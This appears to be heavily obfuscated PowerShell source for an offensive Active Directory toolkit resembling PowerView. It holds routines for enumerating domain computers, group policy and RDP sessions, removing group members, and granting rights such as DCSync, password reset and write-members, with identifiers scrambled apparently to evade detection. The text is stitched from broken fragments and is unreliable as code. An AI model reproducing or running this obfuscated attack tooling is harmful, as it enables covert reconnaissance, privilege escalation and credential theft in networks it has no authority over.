        YoV{COMPIJKUtersIJKEIJKRIJKVicIJKepACk},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b -f S5zteNaS5z,S5zmeS5z,S5zSiS5z})]
        [String]
        YoV{ComPutEIJKRIJKSITenIJKAmE},

        [Parameter(pARAmetErSeTNaME = Z3btArgeIJKTPIJKROceSSZ3b)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{prIJKOcIJKesIJKSName},

        [Parameter(pARaMeteRsetNAME = Z3bTIJKAIJKRGIJKetUSErZ3b)]
        [Parameter(PaRAMEterSETnamE = Z3bUseIJKRIdEnTIJKiTyZ3b)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{USIJKeIJKRIDEntIJKiTY},

        [Parameter(pARaMETeRsETnAMe = Z3btARIJKGETIJKUSErZ3b)]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{USERIJKDOIJKmAIN},

        [Parameter(PaRaMETErSETNAme = Z3btAIJKRgEIJKTuSIJKErZ3b)]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{UseRLIJKdApFIJKiLIJKTer},

        [Parameter(PaRamETersETname = Z3btARgIJKEIJKTuSErZ3b)]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{uSERsEarcIJKHbIJKAIJKsE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b-fS5zupNameS5z,S5zGroS5z}, {Z3b{1}{0}Z3b -fS5zroupS5z,S5zGS5z})]
        [String[]]
        YoV{UIJKsERgROIJKUPIIJKdIJKEnIJKTItY} = (Z3b{1}{0}{2}{3}Z3b -fS5z S5z,S5zDomainS5z,S5zAdmiS5z,S5znsS5z),

        [Parameter(paRAmEterSETNamE = Z3bTIJKARIJKGIJKEtusERZ3b)]
        [Alias({Z3b{0}{2}{1}{3}Z3b -f S5zAdmiS5z,S5zCounS5z,S5znS5z,S5ztS5z})]
','nvoke(YoV{UIJKseRCoIJKNtexT}.Z3bcONteIJKXTZ3b, YoV{USerIIJKdENIJKTIIJKTY})
                YoV{GrIJKoup}.Z3bmEmbIJKeRsZ3b.(Z3b{0}{1}Z3b-f S5zAS5z,S5zddS5z).Invoke(YoV{mIJKemIJKBer})
                YoV{grOIJKUp}.(Z3b{0}{1}Z3b-fS5zSaS5z,S5zveS5z).Invoke()
            }
        }
    }
}


function reMOve-DOMAinGIJKROIJKUpIJKMIJKeMIJKBer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{2}{1}Z3b-fS5zPSS5z,S5zldProcessS5z,S5zuS5z,S5zShoS5z}, S5zS5z)]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTioN = 0, mAnDATORY = YoV{TRIJKUe})]
        [Alias({Z3b{0}{1}{2}Z3b -f S5zGrS5z,S5zoupNS5z,S5zameS5z}, {Z3b{2}{0}{1}{3}Z3b -f S5zdeS5z,S5zntitS5z,S5zGroupIS5z,S5zyS5z})]
        [String]
        YoV{ideIJKNtiIJKTY},

        [Parameter(mAndAtorY = YoV{tIJKRUE}, VaLuefrOmPIpelinE = YoV{tIJKRUE}, vaLUefROMPipELINEbYPrOPERTYNAME = Yo','                     YoV{GpOlOIJKCAlIJKgrOuPIJKmaIJKppi',',S5zNS5z,S5zepropS5z,S5zertyS5z) (Z3b{0}{1}Z3b -f S5zPS5z,S5zathS5z) YoV{TaRgeTIJKPIJKAth}
                    YoV{oIJKUt} JGO &(Z3b{1}{0}{2}Z3b-f S5zdS5z,S5zAS5z,S5zd-MemberS5z) (Z3b{2}{3}{0}{1}Z3b -f S5zerS5z,S5ztyS5z,S5zNotepS5z,S5zropS5z) (Z3b{0}{4}{1}{2}{3}Z3b -fS5zFiS5z,S5zstemRS5z,S5zigS5z,S5zhtsS5z,S5zleSyS5z) (&(Z3b{1}{2}{0}{4}{3}{5}Z3b -f S5zleRiS5z,S5zCoS5z,S5znvert-FiS5z,S5zhS5z,S5zgS5z,S5ztS5z) -FSR YoV{_}.Z3bFileIJKsYIJKSTEIJKmRigIJKHtsZ3b.Z3bVALUIJKeIJK__Z3b)
                    YoV{oIJKUT} JGO &(Z3b{1}{2}{0}Z3b -fS5zerS5z,S5zAS5z,S5zdd-MembS5z) (Z3b{0}{2}{1}{3}Z3b-f S5zNotepS5z,S5zopeS5z,S5zrS5z,S5zrtyS5z) (Z3b{1}{3}{0}{2}Z3b-fS5zntitS5z,S5zIdS5z,S5zyReferenceS5z,S5zeS5z) YoV{NIJKAMe}
                    YoV{oIJKUT} JGO &(Z3b{2}{0}{1}Z3b -fS5zdd-MeS5z,S5zmberS5z,S5zAS5z) (Z3b{2}{1}{0}{3}Z3b -f S5zpeS5z,S5zoS5z,S5zNoteprS5z,S5zrtyS5z) (Z3b{1}{2}{0}Z3b -fS5zDS5z,S5zIdentityS5z,S5zSIS5z) YoV{SIJKid}
                    YoV{OIJKUT} JGO &(Z3b{1}{2}{0}Z3b -fS5zrS5z,S5zAdd-S5z,S5zMembeS5z) (Z3b{0}{1}{2}{3}Z3b -f S5zNotepS5z,S5zrS5z,S5zoS5z,S5zpertyS5z) (Z3b{3}{2}{0}{1}Z3b -fS5zContrS5z,S5zolTypeS5z,S5zssS5z,S5zAcceS5z) YoV{_}.Z3bACCIJKEsIJKscIJKoNtROIJKltYpEZ3b
                    YoV{OIJKUt}.Z3bpsoIJKBIJKjecTZ3b.Z3bTIJKypeIJKNAMeSZ3b.(Z3b{0}{','b -fS5zriteS5z,S5z-S5z,S5zVerS5z,S5zWS5z,S5zboseS5z) (S5z[Get-NeS5z+S5ztRDPSesS5z+S5zsS5z+S5zioS5z+S5zn] S5z+S5zErS5z+S5zror S5z+S5zopS5z+S5zeninS5z+S5zg S5z+S5ztheS5z+S5z S5z+S5zReS5z+S5zmoS5z+S5zte S5z+S5zDesktS5z+S5zoS5z+S5zp S5z+S5zSeS5z+S5zssionS5z+S5z S5z+S5zHoS5z+S5zst S5z+S5z(RDS5z+S5z S5z+S5zSS5z+S5zessS5z+S5zion S5z+S5zHosS5z+S5zt) S5z','b{2}{1}{0}{3}Z3b-f S5zEXPIRE_PASSS5z,S5z_S5z,S5zDONTS5z,S5zWORDS5z)            =   65536
    (Z3','5z+S5z S5z+Z3bYoVSPNZ3b)
                YoV{fIJKIIJKltEr} += Z3b(servicePrincipalName=YoVSPN)Z3b
            }
            if (YoV{pIJKSboIJKUnIJKDPArIJKAIJKMeTErS}[(Z3b{2}{4}{1}{0}{3}Z3b -fS5zeS5z,S5zSystS5z,S5zOpS5z,S5zmS5z,S5zeratingS5z)]) {
                &(Z3b{4}{1}{0}{2}{3}Z3b -f S5z-VeS5z,S5ziteS5z,S5zrS5z,S5zboseS5z,S5zWrS5z) (S5z[Get-DoS5z+S5zmainComS5z+S5zputeS5z+S5zrS5z+S5z] S5z+S5zSeaS5z+S5zrchiS5z+S5zng S5z+S5zfoS5z+S5zr S5z+S5zcompS5z+S5zuS5z+S5zteS5z+S5zrs S5z+S5zwiS5z+S5zth S5z+S5zoS5z+S5zpeS5z+S5zratinS5z+S5zg S5z+S5zsS5z+S5zysS5z+S5ztem: S5z+Z3bYoVOperatingSystemZ3b)
                YoV{FiIJKLtIJKER} += Z3b(operatingsystem=YoVOperatingSystem)Z3b
            }
            if (YoV{pSIJKBounDpARAIJKmETIJKErS}[(Z3b{1}{3}{2}{0}Z3b-fS5zckS5z,S5zSeS5z,S5zaS5z,S5zrvicePS5z)]) {
                &(Z3b{3}{2}{0}{1}Z3b-f S5zte-VerbS5z,S5zoseS5z,S5ziS5z,S5zWrS5z) (S5z[Get-DS5z+S5zomainCoS5z+S5zmputS5z+S5zerS5z+S5z] S5z+S5zSS5z+S5zearchinS5z+S5zg S5z+S5zfoS5z+S5zr S5z+S5zcS5z+S5zoS5z+S5zmpuS5z+S5zters S5z+S5zwithS5z+S5z S5z+S5zserS5z+S5zviceS5z+S5z S5z+S5zpack:S5z+S5z S5z+Z3bYoVServicePackZ3b)
                YoV{filtIJKeR} += Z3b(operatingsystemservicepack=YoVServicePack)Z3b
            }
            if (YoV{psBoIJKUnIJKdparIJKAmeIJKTeRS}[(Z3b{0}{2}{1}Z3b -f S5zSS5z,S5zameS5z,S5ziteNS5z)]) {
                &(Z3b{1}{0}{2}Z3b -f S5zerboS5z,S5zWrite-VS5z,S5zseS5z) (S5z[Get-DoS5z+S5zmainS5z+S5zCompuS5z+S5ztS5z+S5zer]S5z+S5z S5z+S5zSeS5z+S5zarchinS5z+S5zg S5z+S5zforS5z+S5z S5z+S5zcompS5z+S5zuS5z+S5zterS5z+S5zs S5z+S5zwiS5z+S5zth S5z+S5zsitS5z+S5ze S5z+S5znS5z+S5zamS5z+S5ze: S5z+Z3bYoVSiteNameZ3b)
                YoV{FIJKILIJKTeR} += Z3b(serverreferencebl=YoVSiteName)Z3b
            }
            if (YoV{pIJKsBOIJKUIJKNDIJKPArAmETERS}[(Z3b{1}{0}{3}{2}Z3b-f S5zlS5z,S5zLDAPFiS5z,S5zerS5z,S5ztS5z)]) {
                &(Z3b{0}{1}{2}Z3b-f S5zWrite-VS5z,S5zerboS5z,S5zseS5z) (S5z[Get-S5z+S5zDomaS5z+S5zinS5z+S5zCS5z+S5zoS5z+S5zmputer] S5z+S5zUsS5z+S5zing S5z+S5zadditioS5z+S5znaS5z+S5zlS5z+S5z S5z+S5zLDAS5z+S5zP S5z+S5zfiltS5z+S5zer:S5z+S5z S5z+Z3bYoVLDAPFilterZ3b)
                YoV{FiIJKLTEr} += Z3bYoVLDAPFilterZ3b
            }
            
            YoV{uIJKAcfIJKILTeR} JGO &(Z3b{2}{3}{1}{0}Z3b -fS5zctS5z,S5z-ObjeS5z,S5zWherS5z,S5zeS5z) {YoV{_}} JGO &(Z3b{0}{4}{3}{1}{2}Z3b -f S5zFS5z,S5zach-ObjecS5z,S5ztS5z,S5zrES5z,S5zoS5z) {
                if (YoV{_} -match ','S5z+S5zES5z+S5zventData[S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z(S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+((S5z(DaS5z+S5zta[@Name=sS5z+S5zP1LogonS5z+S5zTS5z+S5zyS5z+S5zpeS5z+S5zsP1]=sP15sPS5z+S5z1 S5z) -CRePLaCe ([ChAR]115+[ChAR]80+[ChAR]49),[ChAR]39)+S5zorS5z+S5z S5z+(S5zDS5z+S5zata[@S5z+S5zNamS5z+S5ze={0}LS5z+S5zogoS5z+S5znTypeS5z+S5z{0}]S5z+S5z={0S5z+S5z}0S5z+S5z{0})
 S5z)  -F [Char]39+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zor
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+(S5zDS5z+S5zaS5z+S5ztaS5z+S5z[@Name=S5z+S5z{0}TargetUse','zgeSS5z,S5zizeS5z)] = YoV{rEIJKsIJKUlTPagIJKesiIJKZe} }
        if (YoV{psBoundpIJKAramEtIJKEIJKRs}[(Z3b{1}{2}{0}Z3b -f S5zitS5z,S5zServerTimeLS5z,S5zimS5z)]) { YoV{SeAIJKRCIJKHEIJKRArIJKGIJKUmENts}[(Z3b{4}{0}{2}{1}{3}Z3b-fS5zverS5z,S5zLS5z,S5zTimeS5z,S5zimitS5z,S5zSerS5z)] = YoV{sERIJKVeRTIJKiMeIJKLIJKiMIt} }
        if (YoV{PSBOUIJKNIJKDIJKparIJKAMetErs}[(Z3b{2}{1}{0}Z3b-fS5zneS5z,S5zmbstoS5z,S5zToS5z)]) { YoV{SEaIJKRCHeraRgUIJKmIJKeNts}[(Z3b{2}{1}{0}Z3b-fS5zeS5z,S5zstonS5z,S5zTombS5z)] = YoV{tIJKomIJKBsToNe} }
        if (YoV{PIJKSIJKBOIJKUNDIJKparaIJKmETers}[(Z3b{0}{1}{2}Z3b -f S5zCrS5z,S5zedenS5z,S5ztialS5z)]) { YoV{SIJKEArcHeraIJKRGuIJKMENTs}[(Z3b{2}{0}{1}Z3b -f S5ztiS5z,S5zalS5z,S5zCredenS5z)] = YoV{CIJKREDENtIIJKAL} }
    }

    PROCESS {
        if (YoV{PsbOUIJKNDPIJKARAmEIJKTERS}[(Z3b{1}{0}Z3b -f S','OIJKSEAIJKRCHIJKER}) {
            if (YoV{pSBIJKOuNdpAIJKRIJKAMIJKeTerS}[(Z3b{2}{3}{1}{0}Z3b -fS5zntityS5z,S5zdeS5z,S5zComS5z,S5zputerIS5z)] -or YoV{pSBIJKOIJKUIJKNDPIJKArAmetIJKERs}[(Z3b{3}{0}{2}{1}Z3b -fS5zserIS5z,S5zyS5z,S5zdentitS5z,S5zUS5z)]) {
                YoV{GIJKpOadIJKspaIJKTHS} = @()
                if (YoV{seIJKARcherIJKARGuIJKMenIJKTs}[(Z3b{3}{0}{2}{1}Z3b -f S5zperS5z,S5ziesS5z,S5ztS5z,S5zProS5z)]) {
                    YoV{oIJKlIJKDIJKprOPeIJKRtieS} = YoV{sIJKEaRIJKCheRaRGUIJKmenTS}[(Z3b{2}{0}{1}Z3b -fS5zperS5z,S5ztiesS5z,S5zProS5z)]
                }
                YoV{sIJKEaRCHErarIJKGUmIJKENIJKTs}[(Z3b{1}{0}{2}Z3b-fS5zeS5z,S5zPropertiS5z,S5zsS5z)] = (Z3b{6}{4}{1}{5}{2}{0}{3}Z3b -f S5zhostS5z,S5zdnS5z,S5z,dnsS5z,S5znameS5z,S5zisheS5z,S5zameS5z,S5zdistinguS5z)
                YoV{tARIJKgeTcomPuTErIJKNAIJKMe} = YoV{nUIJKlL}

                if (YoV{PSIJKBIJKOunIJKdIJKparaMetEIJKRS}[(Z3b{4}{0}{1}{3}{2}Z3b-fS5zutS5z,S5zerIS5z,S5zyS5z,S5zdentitS5z,S5zCompS5z)]) {
                    YoV{SeIJKARchIJKeRIJKAIJKRgUmIJKeNTS}[(Z3b{2}{0}{1}Z3b-fS5zentitS5z,S5zyS5z,S5zIdS5z)] = YoV{CoMpuIJKTeriDIJKeNTiIJKTY}
                    YoV{cIJKompuTIJKer} = &(Z3b{0}{1}{3}{2}Z3b-f S5zGetS5z,S5z-DomaiS5z,S5zuterS5z,S5znCompS5z) @SearcherArguments -FindOne JGO &(Z3b{0}{2}{1}Z3b -fS5zSelS5z,S5zjectS5z,S5zect-ObS5z) -First 1
                    if(-not YoV{coIJKmIJKpuTER}) {
                        &(Z3b{2}{3}{1}{4}{0}Z3b-f S5zeS5z,S5ze-S5z,S5zWrS5z,S5zitS5z,S5zVerbosS5z) (S5z[S5z+S5zGetS5z+S5z-DS5z+S5zomainGPO] S5z+S5zComputerS5z+S5z S5z+Z3bS5zYoVComputerIdentityS5z Z3b+S5znS5z+S5zot S5z+S5zfoundS5z+S5z!S5z)
                    }
     ','IJKRAMeIJKTIJKers}[(Z3b{1}{3}{2}{4}{0}Z3b-f S5zteNameS5z,S5zCoS5z,S5zrSS5z,S5zmputeS5z,S5ziS5z)]) { YoV{cOmpIJKUTeRSeAIJKRchEIJKRIJKArgUIJKmEIJKNtS}[(Z3b{0}{1}{2}Z3b -fS5zSiteS5z,S5zNaS5z,S5zmeS5z)] = YoV{SIJKITEIJKName} }
        if (YoV{pSbouNdIJKPIJKARaIJKMETEIJKRS}[(Z3b{0}{1}{2}Z3b-f S5zServS5z,S5zeS5z,S5zrS5z)]) { YoV{coMpuIJKTIJKeIJKRSEaIJKRCIJKHErargumIJKEIJKNTs}[(Z3b{1}{2}{0}Z3b -f S5zrverS5z,S5zSS5z,S5zeS5z)] = YoV{sIJKEIJKRvEr} }
        if (YoV{PsBoUNDParaMIJKEIJKTIJKERs}[(Z3b{2}{0}{3}{1}Z3b-fS5zrchS5z,S5zopeS5z,S5zSeaS5z,S5zScS5z)]) { YoV{COmputerIJKsIJKEaIJKRIJKCHIJKEIJKRARGIJKUMeNTS}[(Z3b{1}{0}{2}Z3b -f S5zpS5z,S5zSearchScoS5z,S5zeS5z)] = YoV{SEaIJKRcIJKHScoIJKpE} }
        if (YoV{pIJKsbOuNDPIJKAIJKRamEtIJKEIJKRs}[(Z3b{2}{1}{0}{3}Z3b -fS5zultPaS5z,S5zesS5z,S5zRS5z,S5zgeSizeS5z)]) { YoV{cOIJKMpUIJKTIJKeRSIJKEArChIJKerIJKARgIJKUmEnts}[(Z3b{2}{0}{1}Z3b -f S5ztPageSizS5z,S5zeS5z,S5zResulS5z)] = YoV{reSUIJKltpIJKAgESiZe} }
        if (YoV{PIJKSBoIJKUIJKNdpARaMIJKETers}[(Z3b{1}{0}{2}Z3b -fS5zimeLimiS5z,S5zServerTS5z,S5ztS5z)]) { YoV{CIJKoMpUTeRSIJKeAIJKRchERaRGUmeIJKNtS}[(Z3b{3}{0}{1}{2}Z3b-fS5zrverTS5z,S5zimeLimiS5z,S5ztS5z,S5zSeS5z)] = YoV{SERveIJKRTiIJKMIJKeLIJKiIJKMIT} }
        if (YoV{PIJKSboIJKUNDIJKparIJKAIJKmetErs}[(Z3b{0}{1}{2}Z3b -f S5zTombS5z,S5zstS5z,S5zoneS5z)]) { YoV{cOmpUtEIJKRIJKSearCIJKhIJKERaRGIJKUmentS}[(Z3b{1}{0}{2}Z3b -f S5zombsS5z,S5zTS5z,S5ztoneS5z)] = YoV{toIJKMbstIJKOne} }
        if (YoV{pSboUNIJKDIJKpARIJKAIJKmeterS}[(Z3b{2}{1}{0}Z3b -f S5zialS5z,S5zedentS5z,S5zCrS5z)]) { YoV{CIJKOMIJKPIJKUTEIJKRSearIJKcHERArGIJKUMIJKeNtS}[(Z3b{0}{2}{1}Z3b-f S5zCS5z,S5ztialS5z,S5zredenS5z)] = YoV{cIJKREDeNIJKTIAL} }

        YoV{USIJKERSeIJKArIJKcIJKheRArIJKguments} = @{
            (Z3b{2}{1}{0}Z3b -fS5ztiesS5z,S5zoperS5z,S5zPrS5z) = (Z3b{1}{2}{3}{0}{4}Z3b-f S5znS5z,S5zsS5z,S5zamaccS5z,S5zountS5z,S5zameS5z)
        }
        if (YoV{PSIJKBOUIJKNDPaRAmIJKeteRs}[(Z3b{2}{1}{0}Z3b-fS5zntityS5z,S5zeS5z,S5zUse','S5zDomaS5z,S5zinS5z})]
        [String]
        YoV{CoMIJKPUTerdIJKomaiN},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{COmpIJKUIJKTeIJKRlIJKDapFiLIJKTEr},

        [ValidateNotNullOrEmpty()]
        [String]
','          
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                   ','{0}{2}{1}Z3b -fS5zeprS5z,S5zrtyS5z,S5zopeS5z,S5zNotS5z) (Z3b{2}{0}{1}Z3b -f S5zecS5z,S5zordTypeS5z,S5zRS5z) (Z3b{1}{0}Z3b -f S5zAMES5z,S5zCNS5z)
        }

        elseif (YoV{rDATAIJKTIJKyIJKpE} -eq 6) {
            
            YoV{DAIJKTA} = YoV( YoV{YxIJKR2}::Z3btObasE64IJKSTIJKRIJKiNgZ3b(YoV{DNIJKsrEcoIJKRd}[24..YoV{dIJKNSIJKREcoIJKRD}.Z3bleIJKNGTHZ3b]))
            YoV{dNsRecIJKoRIJKDobjEIJKcT} JGO &(Z3b{0}{2}{1}Z3b-fS5zAddS5z,S5zberS5z,S5z-MemS5z) (Z3b{0}{3}{2}{1}Z3b-fS5zNoteS5z,S5ztyS5z,S5zrS5z,S5zpropeS5z) (Z3b{1}{2}{3}{0}Z3b-fS5zpeS5z,S5zRecS5z,S5zorS5z,S5zdTyS5z) S5zSOAS5z
        }

        elseif (YoV{rdIJKATIJKAtYPe} -eq 12) {
            YoV{PIJKTr} = &(Z3b{2}{0}{1}Z3b -f S5z-NaS5z,S5zmeS5z,S5zGetS5z) YoV{DnIJKSReCIJKoRD}[24..YoV{DnIJKsrEIJKcoRd}.Z3bLeNIJKgTHZ3b]
            YoV{DaIJKTa} = YoV{pIJKTR}
            YoV{dnsRIJKecoRDIJKoBjeIJKct} JGO &(Z3b{0}{1}{3}{2}Z3b -f S5zAS5z,S5zdd-MS5z,S5zrS5z,S5zembeS5z) (Z3b{0}{1}{2}{3}Z3b -f S5zNotepS5z,S5zropS5z,S5zeS5z,S5zrtyS5z) (Z3b{1}{0}{2}Z3b -fS5zecordS5z,S5zRS5z,S5zTypeS5z) S5zPTRS5z
        }

        elseif (YoV{rdataIJKTYIJKpe} -eq 13) {
            
            YoV{dIJKATa} = YoV( (  &(S5zLSS5z) VARiaBlE:YXR2  ).Z3bvIJKAlUeZ3b::Z3btObIJKAsE6IJK4SIJKTrIIJKNgZ3b(YoV{dNIJKsRECIJKoRd}[24..YoV{dIJKNSRIJKecOrd}.Z3bLengIJKThZ3b]))
            YoV{DIJKNIJKSRecordObIJKJEIJKct} JGO &(Z3b{2}{0}{1}Z3b-f S5zMembS5z,S5zerS5z,S5zAdd-S5z) (Z3b{0}{1}{2}Z3b -f S5zNS5z,S5zotepS5z,S5zropertyS5z) (Z3b{0}{1}{3}{2}Z3b-fS5zRecS5z,S5zorS5z,S5zypeS5z,S5zdTS5z) (Z3b{1}{0}Z3b-f S5zINFOS5z,S5zHS5z)
        }

        elseif (YoV{RIJKdatIJKATYpE} -eq 15) {
            
            YoV{dIJKAta} = YoV( ( &(Z3b{1}{0}Z3b-f S5zirS5z,S5zDS5z)  VAriABle:yXR2).Z3bVAIJKLueZ3b::Z3btobASIJKE64stRIJKINgZ3b(YoV{dNIJKsRIJKECord}[24..YoV{DNIJKsReIJKCIJKORD}.Z3blIJKENIJKgtHZ3b]))
            YoV{dnSrecorDIJKoBJIJKEct} JGO &(Z3b{0}{2}{1}Z3b -f S5zAS5z,S5zrS5z,S5zdd-MembeS5z) (Z3b{2}{1}{0}Z3b-f S5zpropertyS5z,S5zteS5z,S5zNoS5z) (Z3b{1}{0}{2}Z3b -fS5zrdTypS5z,S5zRecoS5z,S5zeS5z) S5zMXS5z
        }

        elseif (YoV{rdaTAIJKTyIJKpe} -eq 16) {
            [string]YoV{tIJKxt}  = S5zS5z
            [int]YoV{seIJKgmentlEnIJKGIJKTh} = YoV{DNSrIJKECIJKoRd}[24]
            YoV{IIJKNDex} = 25

            while (YoV{SEgIJKmeNTlIJKeNGIJKTH}-- -gt 0) {
                YoV{tIJKXt} += [char]YoV{dNsIJKREIJKCoRD}[YoV{IIJKNIJKdeX}++]
            }

            YoV{DaIJKTa} = YoV{TIJKxT}
            YoV{dNIJKSrEIJKcOIJKRdIJKobjECT} JGO &(Z3b{0}{2}{1}{3}Z3b -f S5zAS5z,S5zdS5z,S5zdS5z,S5z-MemberS5z) (Z3b{2}{0}{3}{1}Z3b -f S5zroperS5z,S5zyS5z,S5zNotepS5z,S5ztS5z) (Z3b{0}{2}{1}Z3b -f S5zRS5z,S5zypeS5z,S5zecordTS5z) S5zTXTS5z
        }

        elseif (YoV{rDIJKATaTIJKyPe} -eq 28) {
            
            YoV{dIJKATA} = YoV(  (  &(Z3b{1}{0}{2}Z3b-f S5zRia','JKhBIJKAsE},

        [Parameter(mANDatoRy = YoV{TRIJKUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{prIJKiNIJKcIpAlIIJKdEnTITY},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{PIJKRINCIJKIpaIJKLDomaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b-fS5zollerS5z,S5zmainContrS5z,S5zDoS5z})]
        [String]
        YoV{SIJKeRVIJKeR},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zBasS5z,S5zeS5z}, {Z3b{1}{2}{0}Z3b -fS5zlS5z,S5zOnS5z,S5zeLeveS5z}, {Z3b{0}{1}Z3b-f S5zSS5z,S5zubtreeS5z})]
        [String]
        YoV{sIJKeArCHIJKScOIJKPe} = (Z3b{0}{1}Z3b -fS5zSubtrS5z,S5zeeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ResIJKUIJKlTpAIJKGeIJKsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SErveRIJKTIJKiIJKMElIMIt},

        [Switch]
        YoV{tomIJKBstOIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrIJKeDIJKENTiAl} =   YoV{jIJKFi}::Z3beIJKmptYZ3b,

        [ValidateSet(S5zAllS5z, {Z3b{2}{0}{1}Z3b -f S5zesS5z,S5zetPasswordS5z,S5zRS5z}, {Z3b{1}{2}{0}Z3b-f S5zrsS5z,S5zWriteMembS5z,S5zeS5z}, {Z3b{2}{1}{0}Z3b -f S5zyncS5z,S5zSS5z,S5zDCS5z})]
        [String]
        YoV{rIIJKghts} = S5zAllS5z,

        [Guid]
        YoV{rIJKighIJKTSGIJKUiD}
    )

    BEGIN {
        YoV{TARgEtSEIJKARCherAIJKRgIJKUMIJKEIJKNTS} = @{
            (Z3b{1}{2}{0}Z3b -f S5zertiesS5z,S5zProS5z,S5zpS5z) = (Z3b{1}{3}{0}{2}Z3b-fS5zhedS5z,S5zdistiS5z,S5znameS5z,S5znguisS5z)
            S5zRawS5z = YoV{TRIJKUE}
        }
        if (YoV{PSIJKBoUNDPaIJKRaIJKMETErS}[(Z3b{0}{3}{1}{2}Z3b-fS5zTargetDS5z,S5ziS5z,S5znS5z,S5zomaS5z)]) { YoV{tIJKARIJKGEIJKTsEARIJKCheRIJKAIJKRGumeNts}[(Z3b{0}{1}{2}Z3b-fS5zDoS5z,S5zmS5z,S5zainS5z)] = YoV{TIJKArGIJKetDoMIJKAin} }
        if (YoV{psboIJKUnIJKDIJKparIJKAIJKmetERs}[(Z3b{1}{3}{2}{0}Z3b-fS5zerS5z,S5zTargetLDAPFS5z,S5ztS5z,S5zilS5z)]) { YoV{TaIJKRgeTsEaIJKRchErIJKARIJKGIJKUIJKmeNTs}[(Z3b{2}{0}{1}Z3b -fS5zFiS5z,S5zlterS5z,S5zLDAPS5z)] = YoV{TarGeTlDAIJKpIJKFiltIJKeR} }
        if (YoV{PIJKSbOuNDIJKpARAmeTIJKeIJKRs}[(Z3b{1}{0}{3}{2}Z3b-fS5zgS5z,S5zTarS5z,S5zBaseS5z,S5zetSearchS5z)]) { YoV{TargetsIJKeArcheraRIJKGIJKUMEIJKNtS}[(Z3b{2}{0}{1}Z3b-f S5zearchBaS5z,S5zseS5z,S5zSS5z)] = YoV{TArgeIJKTIJKseArIJKchBIJKAsE} }
        if (YoV{PIJKsbIJKouNDpIJKAIJKRAmIJKETeRs}[(Z3b{2}{0}{1}Z3b-f S5zrvS5z,S5zerS5z,S5zSeS5z)]) { YoV','KMe} = YoV{eNVIJK:CompIJKUIJKTIJKErNIJKAme},

        [ValidateSet(S5zAPIS5z, {Z3b{0}{1}Z3b -fS5zWinNS5z,S5zTS5z})]
        [Alias({Z3b{2}{1}{0}{3}Z3b-f S5zMetS5z,S5zonS5z,S5zCollectiS5z,S5zhodS5z})]
        [String]
        YoV{MetIJKhIJKOd} = S5zAPIS5z,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{creIJKdeNIJKTIAL} =  YoV{JIJKFI}::Z3bEIJKMPtYZ3b
    )

    BEGIN {
        if (YoV{PSboIJKUNDIJKPAIJKRIJKAMEtERS}[(Z3b{0}{2}{1}Z3b -fS5zCredeS5z,S5zlS5z','S5z)] = YoV{lDIJKApIJKFIlIJKTEr} }
        if (YoV{PSBoUndIJKpARAIJKMIJKETIJKEIJKRS}[(Z3b{1}{2}{0}Z3b -f S5zchBaseS5z,S5zSS5z,S5zearS5z)]) { YoV{SeaIJKRcIJKHIJKeIJKRIJKARGUmEnTs}[(Z3b{0}{1}{2}Z3b -fS5zSeS5z,S5zarchBS5z,S5zaseS5z)] = YoV{sIJKeARcHbAIJKsE} }
        if (YoV{PSBIJKOuIJKNDPIJKAraMIJKEterS}[(Z3b{0}{1}Z3b-f S5zServS5z,S5zerS5z)]) { YoV{SeIJKARIJKCheIJKRaRguIJKmENTs}[(Z3b{0}{1}Z3b -fS5zServS5z,S5zerS5z)] = YoV{seIJKRIJKVEr} }
        if (YoV{PsBoUIJKNDpIJKARameTEIJKRS}[(Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zSearchScS5z,S5zopS5z)]) { YoV{SIJKEarCIJKhERIJKARgumENIJKTs}[(Z','       YoV{Up} = YoV{TRIJKUe}
                if (YoV{PIJKSbIJKOuIJKNdIJKpArAIJKmetERS}[(Z3b{1}{0}Z3b-fS5zingS5z,S5zPS5z)]) {
